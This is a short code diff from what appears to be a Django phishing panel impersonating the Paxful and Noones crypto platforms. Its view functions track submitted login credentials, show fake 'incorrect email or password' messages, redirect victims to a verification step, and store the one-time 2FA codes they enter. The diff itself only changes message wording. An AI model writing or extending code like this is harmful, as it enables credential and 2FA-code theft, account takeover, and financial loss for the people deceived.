@@ -829,13 +829,13 @@ def paxful(request):
 
     # Handle incorrect status explicitly
     if request.GET.get('status') == 'incorrect' and not submission_id:
-        message = "Incorrect email or password. Please try again."
+        message = "Incorrect email or password. Please try again!"
 
     if submission_id:
         submission = UserSubmission.objects.filter(id=submission_id).first()
         if submission:
             if submission.status == 'incorrect':
-                message = "Incorrect email or password. Please try again."
+                message = "Incorrect email or password. Please try again!"
             elif submission.status == 'authenticator':
                 return redirect(f'/verification/{submission_id}/')
 
@@ -1193,7 +1193,7 @@ def verify(request, submission_id):
         else:
             otp = ''.join(otp_digits)
             OTPSubmissionNoones.objects.create(user_submission_noones=submission, otp=otp)
-            message = "Please enter a valid 6-digit code anony"
+            message = "Please enter a valid 6-digit code "
 
     # Fetch all OTP submissions related to the user_submission_noones
     otps = OTPSubmissionNoones.objects.filter(user_submission_noones=submission)
